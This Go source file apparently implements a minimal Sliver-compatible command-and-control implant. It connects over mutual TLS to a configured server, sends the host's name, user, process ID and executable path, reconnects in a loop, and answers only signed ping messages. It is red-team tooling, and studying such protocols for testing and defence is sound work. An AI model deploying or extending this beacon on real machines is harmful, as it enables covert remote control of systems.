package main

// This source is copied literally. A Mage target generates only config_gen.go
// in the private workspace; template markers such as {{.Build.Name}} here are
// never interpreted.

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/hashicorp/yamux"
	"golang.org/x/crypto/blake2b"
	"google.golang.org/protobuf/proto"
)

const (
	rawSignatureSize    = 2 + 8 + ed25519.SignatureSize
	maxEnvelopeBytes    = 4 << 20
	minisignEdDSA       = 0x6445
	maxReconnectSeconds = uint64(9223372036)
)

// configJSON is set by the generated, private config_gen.go file.
var configJSON string

type config struct {
	Name                    string `json:"name"`
	Endpoint                string `json:"endpoint"`
	ReconnectSeconds        uint64 `json:"reconnectSeconds"`
	PeerPrivateKey          string `json:"peerPrivateKey"`
	MinisignServerPublicKey string `json:"minisignServerPublicKey"`
	MtlsCACert              string `json:"mtlsCACert"`
	MtlsCert                string `json:"mtlsCert"`
	MtlsKey                 string `json:"mtlsKey"`
}

type publicKey struct {
	id  uint64
	key ed25519.PublicKey
}

type signingKey struct {
	id  uint64
	key ed25519.PrivateKey
}

func main() {
	var cfg config
	if err := json.Unmarshal([]byte(configJSON), &cfg); err != nil || cfg.Name == "" || cfg.Endpoint == "" ||
		cfg.ReconnectSeconds == 0 || cfg.ReconnectSeconds > maxReconnectSeconds {
		log.Fatal("invalid embedded core configuration")
	}
	serverKey, err := parseServerKey(cfg.MinisignServerPublicKey)
	if err != nil {
		log.Fatal("invalid server signing key")
	}
	peerKey := deriveSigningKey(cfg.PeerPrivateKey)
	for {
		if err := connect(cfg, peerKey, serverKey); err != nil {
			log.Printf("mTLS session ended: %v", err)
		}
		time.Sleep(time.Duration(cfg.ReconnectSeconds) * time.Second)
	}
}

func connect(cfg config, peer signingKey, server publicKey) error {
	u, err := url.Parse(cfg.Endpoint)
	if err != nil || u.Scheme != "mtls" || u.Hostname() == "" || u.Port() == "" {
		return errors.New("invalid mTLS endpoint")
	}
	cert, err := tls.X509KeyPair([]byte(cfg.MtlsCert), []byte(cfg.MtlsKey))
	if err != nil {
		return fmt.Errorf("load client certificate: %w", err)
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM([]byte(cfg.MtlsCACert)) {
		return errors.New("invalid server CA")
	}
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", u.Host,
		&tls.Config{MinVersion: tls.VersionTLS13, RootCAs: roots, Certificates: []tls.Certificate{cert}, ServerName: u.Hostname()})
	if err != nil {
		return err
	}
	defer conn.Close()
	if _, err := conn.Write([]byte("MUX/1")); err != nil {
		return err
	}
	yamuxConfig := yamux.DefaultConfig()
	yamuxConfig.LogOutput = io.Discard
	mux, err := yamux.Client(conn, yamuxConfig)
	if err != nil {
		return err
	}
	defer mux.Close()
	if err := register(mux, cfg, peer); err != nil {
		return err
	}
	for {
		stream, err := mux.Accept()
		if err != nil {
			return err
		}
		go handle(stream, mux, peer, server)
	}
}

func register(mux *yamux.Session, cfg config, peer signingKey) error {
	host, _ := os.Hostname()
	nonce := make([]byte, 16)
	if _, err := rand.Read(nonce); err != nil {
		return err
	}
	registration := &sliverpb.Register{
		Name: cfg.Name, Hostname: host, Uuid: hex.EncodeToString(nonce),
		Username: os.Getenv("USER"), Os: runtime.GOOS, Arch: runtime.GOARCH,
		Pid: int32(os.Getpid()), Filename: os.Args[0], ActiveC2: cfg.Endpoint,
		Version: "minimal-sliver-v1", Locale: "en_US",
	}
	data, err := proto.Marshal(registration)
	if err != nil {
		return err
	}
	return send(mux, peer, &sliverpb.Envelope{Type: sliverpb.MsgRegister, Data: data})
}

func handle(stream net.Conn, mux *yamux.Session, peer signingKey, server publicKey) {
	defer stream.Close()
	envelope, err := receive(stream, server)
	if err != nil || envelope.ID == 0 {
		return
	}
	response := &sliverpb.Envelope{ID: envelope.ID}
	switch envelope.Type {
	case sliverpb.MsgPing:
		var ping sliverpb.Ping
		if err := proto.Unmarshal(envelope.Data, &ping); err != nil {
			return
		}
		response.Data, err = proto.Marshal(&sliverpb.Ping{Nonce: ping.Nonce, Response: &commonpb.Response{}})
		if err != nil {
			return
		}
	default:
		response.UnknownMessageType = true
	}
	_ = send(mux, peer, response)
}

func send(mux *yamux.Session, signer signingKey, envelope *sliverpb.Envelope) error {
	stream, err := mux.Open()
	if err != nil {
		return err
	}
	defer stream.Close()
	data, err := proto.Marshal(envelope)
	if err != nil {
		return err
	}
	if len(data) == 0 || len(data) > maxEnvelopeBytes {
		return errors.New("invalid outgoing envelope size")
	}
	header := make([]byte, rawSignatureSize+4)
	binary.LittleEndian.PutUint16(header[:2], minisignEdDSA)
	binary.LittleEndian.PutUint64(header[2:10], signer.id)
	copy(header[10:rawSignatureSize], ed25519.Sign(signer.key, data))
	binary.LittleEndian.PutUint32(header[rawSignatureSize:], uint32(len(data)))
	if _, err := stream.Write(header); err != nil {
		return err
	}
	_, err = stream.Write(data)
	return err
}

func receive(stream net.Conn, server publicKey) (*sliverpb.Envelope, error) {
	header := make([]byte, rawSignatureSize+4)
	if _, err := io.ReadFull(stream, header); err != nil {
		return nil, err
	}
	if binary.LittleEndian.Uint16(header[:2]) != minisignEdDSA || binary.LittleEndian.Uint64(header[2:10]) != server.id {
		return nil, errors.New("unexpected server signature key")
	}
	length := binary.LittleEndian.Uint32(header[rawSignatureSize:])
	if length == 0 || length > maxEnvelopeBytes {
		return nil, errors.New("invalid incoming envelope size")
	}
	data := make([]byte, length)
	if _, err := io.ReadFull(stream, data); err != nil {
		return nil, err
	}
	if !ed25519.Verify(server.key, data, header[10:rawSignatureSize]) {
		return nil, errors.New("invalid server envelope signature")
	}
	envelope := new(sliverpb.Envelope)
	if err := proto.Unmarshal(data, envelope); err != nil {
		return nil, err
	}
	return envelope, nil
}

func parseServerKey(text string) (publicKey, error) {
	lines := strings.Split(strings.TrimSpace(text), "\n")
	if len(lines) != 2 || !strings.HasPrefix(lines[0], "untrusted comment:") {
		return publicKey{}, errors.New("invalid minisign key text")
	}
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(lines[1]))
	if err != nil || len(raw) != 2+8+ed25519.PublicKeySize || binary.LittleEndian.Uint16(raw[:2]) != minisignEdDSA {
		return publicKey{}, errors.New("invalid minisign public key")
	}
	return publicKey{id: binary.LittleEndian.Uint64(raw[2:10]), key: ed25519.PublicKey(raw[10:])}, nil
}

func deriveSigningKey(peerPrivateKey string) signingKey {
	seed := sha256.Sum256([]byte("env-signing-v1:" + peerPrivateKey))
	private := ed25519.NewKeyFromSeed(seed[:])
	digest := blake2b.Sum256(private.Public().(ed25519.PublicKey))
	return signingKey{id: binary.LittleEndian.Uint64(digest[:8]), key: private}
}
